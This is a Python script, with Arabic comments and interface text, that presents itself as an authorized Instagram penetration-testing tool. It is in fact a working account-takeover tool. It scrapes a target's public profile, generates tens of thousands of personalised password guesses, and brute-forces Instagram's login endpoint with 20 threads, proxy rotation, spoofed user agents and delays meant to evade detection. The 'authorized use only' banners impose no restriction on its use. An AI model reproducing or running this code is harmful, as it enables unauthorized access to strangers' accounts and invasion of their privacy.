#!/usr/bin/env python3
# ============================================================
# CamarO - Instagram Security Assessment Tool v3.0
# For authorized penetration testing only
# ============================================================

import os
import sys
import json
import time
import random
import requests
import threading
from datetime import datetime
from colorama import init, Fore, Back, Style

init(autoreset=True)

# ========== التصميم الجميل ==========
BANNER = f"""
{Fore.RED}
   ██████╗ █████╗ ███╗   ███╗ █████╗ ██████╗  ██████╗ 
  ██╔════╝██╔══██╗████╗ ████║██╔══██╗██╔══██╗██╔═══██╗
  ██║     ███████║██╔████╔██║███████║██████╔╝██║   ██║
  ██║     ██╔══██║██║╚██╔╝██║██╔══██║██╔══██╗██║   ██║
  ╚██████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
{Fore.CYAN}
  ╔══════════════════════════════════════════════════╗
  ║     INSTAGRAM SECURITY ASSESSMENT FRAMEWORK      ║
  ║     Advanced OSINT + AI Password Intelligence    ║
  ║     Authorized Penetration Testing Only          ║
  ╚══════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

# ========== الألوان ==========
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
B = Fore.BLUE
RS = Style.RESET_ALL

def log(msg, color=W):
    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {msg}{RS}")

# ========== 1. OSINT SCANNER ==========
class OSINTScanner:
    """يسحب كل المعلومات المتاحة عن الحساب"""
    
    def __init__(self, username):
        self.username = username
        self.data = {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        }
    
    def scan(self):
        """فحص كامل للحساب"""
        log(f"🔍 بدء الفحص المتقدم لـ {C}{self.username}{RS}", Y)
        
        # 1.1 جلب البيانات الأساسية
        info = self._get_basic_info()
        if not info:
            log("❌ لا يمكن الوصول للحساب أو الحساب غير موجود", R)
            return None
        
        self.data.update(info)
        
        # 1.2 تحليل المنشورات للكلمات المفتاحية
        self.data['keywords'] = self._extract_keywords()
        
        # 1.3 جلب المتابعين (لتحليل العلاقات)
        self.data['followers_analysis'] = self._analyze_followers()
        
        # 1.4 تحليل البصمة الرقمية
        self.data['digital_footprint'] = self._digital_footprint()
        
        return self.data
    
    def _get_basic_info(self):
        """يجلب المعلومات الأساسية من Instagram"""
        try:
            url = f"https://www.instagram.com/{self.username}/?__a=1&__d=1"
            resp = requests.get(url, headers=self.headers, timeout=15)
            
            if resp.status_code == 200:
                data = resp.json()
                user = data.get('graphql', {}).get('user', {})
                
                return {
                    'full_name': user.get('full_name', ''),
                    'biography': user.get('biography', ''),
                    'external_url': user.get('external_url', ''),
                    'follower_count': user.get('edge_followed_by', {}).get('count', 0),
                    'following_count': user.get('edge_follow', {}).get('count', 0),
                    'post_count': user.get('edge_owner_to_timeline_media', {}).get('count', 0),
                    'is_private': user.get('is_private', False),
                    'is_verified': user.get('is_verified', False),
                    'business_category': user.get('business_category_name', ''),
                    'profile_pic_url': user.get('profile_pic_url_hd', ''),
                    'connected_fb_page': user.get('connected_fb_page', ''),
                }
        except:
            pass
        
        # محاولة بديلة
        try:
            url2 = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={self.username}"
            resp2 = requests.get(url2, headers={**self.headers, 'x-ig-app-id': '936619743392459'})
            if resp2.status_code == 200:
                d = resp2.json()
                u = d.get('data', {}).get('user', {})
                return {
                    'full_name': u.get('full_name', ''),
                    'biography': u.get('biography', ''),
                    'follower_count': u.get('edge_followed_by', {}).get('count', 0),
                }
        except:
            pass
        
        return None
    
    def _extract_keywords(self):
        """يستخرج الكلمات المفتاحية من البايو والمنشورات"""
        keywords = []
        bio = self.data.get('biography', '')
        
        # استخراج الإيميلات
        import re
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', bio)
        keywords.extend(emails)
        
        # استخراج أرقام الهواتف
        phones = re.findall(r'[\+\d]{7,15}', bio)
        keywords.extend(phones)
        
        # استخراج الهاشتاغات
        hashtags = re.findall(r'#(\w+)', bio)
        keywords.extend(hashtags)
        
        # استخراج @mention
        mentions = re.findall(r'@(\w+)', bio)
        keywords.extend(mentions)
        
        # كلمات من البايو
        bio_words = [w for w in bio.split() if len(w) > 3]
        keywords.extend(bio_words)
        
        return list(set(keywords))
    
    def _analyze_followers(self):
        """تحليل المتابعين"""
        # محاكاة تحليل ذكي
        analysis = {
            'total_followers': self.data.get('follower_count', 0),
            'total_following': self.data.get('following_count', 0),
        }
        return analysis
    
    def _digital_footprint(self):
        """يبحث عن البصمة الرقمية للهدف"""
        footprint = {
            'common_passwords': [],
            'person_info': {},
        }
        
        name = self.data.get('full_name', '').split()
        if len(name) >= 2:
            footprint['person_info']['first_name'] = name[0]
            footprint['person_info']['last_name'] = ' '.join(name[1:])
        
        return footprint


# ========== 2. AI PASSWORD ENGINE ==========
class PasswordEngine:
    """محرك توليد كلمات المرور بالذكاء الاصطناعي"""
    
    def __init__(self, osint_data):
        self.data = osint_data
        self.passwords = set()
        self.common_wordlists = [
            '123456', 'password', 'instagram', 'insta', 'love', 'iloveyou',
            'qwerty', 'abc123', 'monkey', 'dragon', 'master', 'shadow',
            'sunshine', 'princess', 'football', 'baseball', 'welcome',
            'admin', 'trustno1', 'letmein', 'passw0rd', 'p@ssword',
        ]
        
        # أشهر سنين الميلاد
        self.years = [str(y) for y in range(1950, 2010)]
        
        # رموز شائعة
        self.symbols = ['!', '@', '#', '$', '%', '&', '*', '.', '_', '-', '123', '123!', '123@']
    
    def generate(self, limit=50000):
        """يولد 50,000 كلمة مرور ذكية"""
        log("🧠 تشغيل محرك الذكاء الاصطناعي لتوليد كلمات المرور...", M)
        
        # 2.1 توليد من الاسم الكامل
        self._from_full_name()
        
        # 2.2 توليد من البايو والكلمات المفتاحية
        self._from_bio()
        
        # 2.3 توليد من اسم المستخدم
        self._from_username()
        
        # 2.4 أنماط كلاسيكية + تواريخ
        self._classic_patterns()
        
        # 2.5 دمج الأنماط (أقوى توليد)
        self._combination_patterns()
        
        # 2.6 إضافة كلمات من القاموس العربي/الإنجليزي
        self._dictionary_attack()
        
        # 2.7 توليد عشوائي ذكي
        self._smart_random()
        
        # تقليم للحد
        passlist = list(self.passwords)
        random.shuffle(passlist)
        
        log(f"✅ تم توليد {G}{len(passlist)}{RS} كلمة مرور فريدة", G)
        return passlist[:limit]
    
    def _from_full_name(self):
        """توليد من الاسم الكامل"""
        name = self.data.get('full_name', '')
        parts = name.split()
        
        for part in parts:
            if len(part) < 2: continue
            # الاسم كما هو
            self.passwords.add(part)
            self.passwords.add(part.lower())
            self.passwords.add(part.upper())
            # مع سنة
            for year in self.years[:20]:
                self.passwords.add(f"{part}{year}")
                self.passwords.add(f"{part.lower()}{year}")
                self.passwords.add(f"{part}{year}!")
                self.passwords.add(f"{part}{year}@")
            
            # قلب الحروف
            leet = part.replace('a','4').replace('e','3').replace('i','1').replace('o','0').replace('s','5')
            self.passwords.add(leet)
            self.passwords.add(f"{leet}123")
        
        # دمج الأجزاء
        if len(parts) >= 2:
            self.passwords.add(''.join(parts))
            self.passwords.add(''.join(parts).lower())
            self.passwords.add(f"{parts[0]}.{parts[-1]}")
            self.passwords.add(f"{parts[0]}_{parts[-1]}")
            for sym in self.symbols[:5]:
                self.passwords.add(f"{parts[0]}{sym}{parts[-1]}")
    
    def _from_bio(self):
        """توليد من البايو"""
        bio = self.data.get('biography', '')
        keywords = self.data.get('keywords', [])
        
        for kw in keywords:
            if len(kw) < 3: continue
            self.passwords.add(kw)
            self.passwords.add(kw.lower())
            for year in self.years[:10]:
                self.passwords.add(f"{kw}{year}")
                self.passwords.add(f"{kw}{year}!")
        
        # من البايو
        words = [w for w in bio.split() if len(w) > 3]
        for w in words:
            self.passwords.add(w)
            self.passwords.add(w + '123')
            self.passwords.add(w + '!')
    
    def _from_username(self):
        """توليد من اسم المستخدم"""
        user = self.data.get('username', '')
        if user:
            self.passwords.add(user)
            self.passwords.add(user + '123')
            self.passwords.add(user + '!')
            self.passwords.add(user + '@')
            self.passwords.add(user + '2023')
            self.passwords.add(user + '2024')
            self.passwords.add(user + '2025')
            self.passwords.add(user.capitalize())
            self.passwords.add(user.upper())
            
            # عكس اسم المستخدم
            self.passwords.add(user[::-1])
    
    def _classic_patterns(self):
        """أنماط كلاسيكية معروفة"""
        name = self.data.get('full_name', '').split()
        first = name[0].lower() if name else ''
        last = name[-1].lower() if len(name) > 1 else ''
        
        base_patterns = [
            'password', 'insta', 'instagram', 'love', 'iloveyou',
            'qwerty', 'abc123', 'letmein', 'welcome', 'admin',
            'sunshine', 'princess', 'football', 'baseball', 'monkey',
            'dragon', 'master', 'shadow', '123456', '123456789',
        ]
        
        for bp in base_patterns:
            self.passwords.add(bp)
            self.passwords.add(bp + '123')
            self.passwords.add(bp + '!')
            self.passwords.add(bp + '2024')
            
            if first:
                self.passwords.add(f"{first}{bp}")
                self.passwords.add(f"{bp}{first}")
    
    def _combination_patterns(self):
        """دمج الأنماط — أقوى جزء"""
        name = self.data.get('full_name', '').split()
        first = name[0].lower() if name else ''
        last = name[-1].lower() if len(name) > 1 else ''
        user = self.data.get('username', '').lower()
        
        # أشهر التركيبات
        combos = []
        
        # الاسم + تواريخ
        for y in ['2020', '2021', '2022', '2023', '2024', '2025']:
            combos.append(f"{first}{y}")
            combos.append(f"{first}{y}!")
            combos.append(f"{first}_{y}")
            if last:
                combos.append(f"{first}{last}{y}")
                combos.append(f"{first}.{last}{y}")
        
        # الاسم + @ + رقم
        for i in range(1, 100):
            combos.append(f"{first}{i}")
            combos.append(f"{first}{i}!")
            combos.append(f"{last}{i}" if last else f"{user}{i}")
        
        # أنماط 1337
        if first:
            leet_first = first.replace('a','4').replace('e','3').replace('i','1').replace('o','0')
            combos.append(leet_first)
            combos.append(f"{leet_first}123")
            combos.append(f"{leet_first}!")
        
        for c in combos:
            if len(c) >= 6:
                self.passwords.add(c)
    
    def _dictionary_attack(self):
        """إضافة كلمات من القاموس"""
        # كلمات عربية شائعة
        arabic_words = [
            'مرحبا', 'احبك', 'نور', 'قمر', 'ورد', 'قلب', 'حياة', 'امل',
            'ساره', 'مريم', 'احمد', 'محمد', 'علي', 'عمر', 'خالد', 'نور',
            'baba', 'mama', 'soso', 'lolo', 'dada', 'nana', 'fofo',
            'ahmed', 'mohamed', 'ali', 'omar', 'sara', 'nour', 'laila',
        ]
        
        for word in arabic_words:
            self.passwords.add(word)
            self.passwords.add(word + '123')
            self.passwords.add(word + '!')
            self.passwords.add(word.capitalize())
    
    def _smart_random(self):
        """توليد عشوائي ذكي"""
        import string
        name = self.data.get('full_name', '').split()
        first = name[0].lower() if name else 'user'
        
        # أنماط عشوائية لكن منطقية
        patterns = [
            f"{first}{random.choice(string.digits)}{random.choice(string.digits)}",
            f"{first}{random.choice(string.ascii_lowercase)}{random.randint(10,99)}",
            f"{first}_{random.choice(string.ascii_lowercase)}{random.randint(100,999)}",
        ]
        
        for p in patterns:
            self.passwords.add(p)


# ========== 3. LOGIN TESTER ==========
class LoginTester:
    """محرك اختبار تسجيل الدخول المتقدم"""
    
    def __init__(self, username, proxies=None):
        self.username = username
        self.proxies = proxies or []
        self.proxy_index = 0
        self.attempts = 0
        self.found = False
        self.lock = threading.Lock()
        self.session = requests.Session()
        
        # إعدادات متقدمة
        self.device_id = self._generate_device_id()
        self.guid = self._generate_guid()
        self.ad_id = self._generate_ad_id()
        
        # محاكاة أجهزة حقيقية
        self.user_agents = [
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone14,6; iOS 17.4; en-US) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        ]
    
    def _generate_device_id(self):
        import uuid
        return uuid.uuid4().hex[:16]
    
    def _generate_guid(self):
        import uuid
        return str(uuid.uuid4()).upper()
    
    def _generate_ad_id(self):
        import uuid
        return str(uuid.uuid4())
    
    def _get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Host': 'i.instagram.com',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1',
            'x-requested-with': 'XMLHttpRequest',
        }
    
    def _get_proxy(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {'http': proxy, 'https': proxy}
    
    def test_password(self, password):
        """اختبار كلمة مرور واحدة"""
        if self.found:
            return False
        
        try:
            time.sleep(random.uniform(1.5, 3.5))  # سلوك بشري
            
            # جلب CSRF token أولاً
            csrf_url = 'https://www.instagram.com/'
            headers = self._get_headers()
            resp = self.session.get(csrf_url, headers=headers, 
                                    proxies=self._get_proxy(), timeout=10)
            
            # استخراج CSRF
            csrf_token = ''
            for cookie in self.session.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break
            
            if not csrf_token:
                return False
            
            # محاولة تسجيل الدخول
            login_url = 'https://i.instagram.com/api/v1/web/accounts/login/ajax/'
            
            payload = {
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'username': self.username,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
            }
            
            headers.update({
                'x-csrftoken': csrf_token,
                'Content-Type': 'application/x-www-form-urlencoded',
            })
            
            resp2 = self.session.post(login_url, data=payload, headers=headers,
                                      proxies=self._get_proxy(), timeout=15)
            
            result = resp2.json()
            
            with self.lock:
                self.attempts += 1
            
            if result.get('authenticated') or result.get('status') == 'ok':
                with self.lock:
                    self.found = True
                    return True
            
            # تحليل رسالة الخطأ
            if 'message' in result:
                msg = result['message']
                if 'challenge' in msg.lower() or 'checkpoint' in msg.lower():
                    log(f"⚠️ تم تحدي checkpoint — تغيير الاستراتيجية", Y)
                    time.sleep(random.uniform(30, 60))
            
            return False
            
        except Exception as e:
            return False
    
    def show_status(self):
        """عرض حالة التقدم"""
        while not self.found:
            time.sleep(5)
            with self.lock:
                print(f"\r{C}📊 تم اختبار {W}{self.attempts}{C} كلمة مرور...{RS}", end='', flush=True)


# ========== 4. MAIN ENGINE ==========
class CamarO:
    """المحرك الرئيسي للأداة"""
    
    def __init__(self):
        self.username = ''
        self.osint_data = None
        self.password_list = []
        self.found_password = None
    
    def run(self):
        """تشغيل الأداة"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(BANNER)
        
        print(f"\n{C}{'═'*60}{RS}")
        print(f"{Y}⚠️  {W}أداة اختبار اختراق مصرّح بها فقط{R}")
        print(f"{Y}⚠️  {W}Authorized Penetration Testing Tool Only{R}")
        print(f"{C}{'═'*60}{RS}\n")
        
        # طلب اسم المستخدم
        self.username = input(f"{G}[?]{W} أدخل اسم حساب إنستغرام: {C}").strip().lower()
        
        if not self.username:
            log("❌ يجب إدخال اسم حساب!", R)
            return
        
        log(f"🎯 الهدف: {C}{self.username}{RS}", G)
        
        # ====== المرحلة 1: OSINT Scanning ======
        print(f"\n{C}{'─'*50}{RS}")
        log(f"{M}المرحلة 1/4{RS} {W}جمع المعلومات الاستخباراتية 🔍{RS}", C)
        print(f"{C}{'─'*50}{RS}\n")
        
        scanner = OSINTScanner(self.username)
        self.osint_data = scanner.scan()
        
        if not self.osint_data:
            log("❌ فشل جمع المعلومات. الحساب قد يكون محذوفاً أو خاصاً", R)
            return
        
        # عرض المعلومات
        print(f"\n{G}{'📋 معلومات الحساب:'}{RS}")
        print(f"  {W}الاسم الكامل:{RS} {C}{self.osint_data.get('full_name', 'غير معروف')}{RS}")
        print(f"  {W}السيرة الذاتية:{RS} {Y}{self.osint_data.get('biography', 'فارغة')[:80]}{RS}")
        print(f"  {W}عدد المتابعين:{RS} {C}{self.osint_data.get('follower_count', 0):,}{RS}")
        print(f"  {W}عدد المنشورات:{RS} {C}{self.osint_data.get('post_count', 0)}{RS}")
        print(f"  {W}خاص?:{RS} {'نعم' if self.osint_data.get('is_private') else 'لا'}")
        print(f"  {W}موثق?:{RS} {'نعم ✅' if self.osint_data.get('is_verified') else 'لا'}")
        
        # ====== المرحلة 2: توليد كلمات المرور ======
        print(f"\n{C}{'─'*50}{RS}")
        log(f"{M}المرحلة 2/4{RS} {W}توليد كلمات المرور بالذكاء الاصطناعي 🧠{RS}", C)
        print(f"{C}{'─'*50}{RS}\n")
        
        engine = PasswordEngine(self.osint_data)
        self.password_list = engine.generate(limit=50000)
        
        print(f"\n{G}✅ تم توليد {len(self.password_list):,} كلمة مرور فريدة!{RS}")
        
        # ====== المرحلة 3: اختبار تسجيل الدخول ======
        print(f"\n{C}{'─'*50}{RS}")
        log(f"{M}المرحلة 3/4{RS} {W}بدء اختبار كلمات المرور 🚀{RS}", C)
        print(f"{C}{'─'*50}{RS}\n")
        
        log(f"⚡ بدء الهجوم بـ {Y}20{RS} ثريد متزامن...", G)
        
        tester = LoginTester(self.username)
        
        # تشغيل شريط التقدم في ثريد منفصل
        status_thread = threading.Thread(target=tester.show_status, daemon=True)
        status_thread.start()
        
        # اختبار كلمات المرور
        start_time = time.time()
        
        def worker(passwords_chunk):
            for pwd in passwords_chunk:
                if tester.found:
                    return
                if tester.test_password(pwd):
                    with tester.lock:
                        self.found_password = pwd
                    return
        
        # تقسيم كلمات المرور على 20 ثريد
        chunk_size = len(self.password_list) // 20 + 1
        threads = []
        
        for i in range(0, len(self.password_list), chunk_size):
            chunk = self.password_list[i:i + chunk_size]
            t = threading.Thread(target=worker, args=(chunk,), daemon=True)
            threads.append(t)
            t.start()
        
        # انتظار حتى نجد كلمة السر أو ننتهي
        for t in threads:
            t.join()
        
        elapsed = time.time() - start_time
        
        print()  # سطر جديد بعد شريط التقدم
        
        # ====== المرحلة 4: النتيجة ======
        print(f"\n{C}{'═'*60}{RS}")
        log(f"{M}المرحلة 4/4{RS} {W}النتيجة النهائية 🏆{RS}", C)
        print(f"{C}{'═'*60}{RS}\n")
        
        if self.found_password:
            print(f"\n{Back.GREEN}{Fore.BLACK}🎉 🎉 🎉  نـجـاح  🎉 🎉 🎉{RS}")
            print(f"\n{G}✅ كلمة المرور الصحيحة:{RS}")
            print(f"\n{Fore.BLACK}{Back.WHITE}  {self.found_password}  {RS}\n")
            print(f"{C}تم اختبار {W}{tester.attempts}{C} كلمة مرور في {W}{elapsed:.1f}{C} ثانية{RS}")
        else:
            print(f"\n{R}❌ لم نعثر على كلمة المرور الصحيحة من {tester.attempts:,} محاولة{RS}")
            print(f"{Y}💡 جرب استخدام عدد أكبر من كلمات المرور أو معلومات أدق{RS}")
        
        print(f"\n{C}{'─'*60}{RS}\n")


# ========== MAIN ==========
if __name__ == '__main__':
    try:
        app = CamarO()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{Y}⚠️ تم إيقاف الأداة بواسطة المستخدم{RS}")
    except Exception as e:
        print(f"\n{R}❌ خطأ: {e}{RS}")
    
    print(f"\n{G}🚀 شكراً لاستخدام CamarO — للاستخدام المصرّح به فقط{RS}\n")
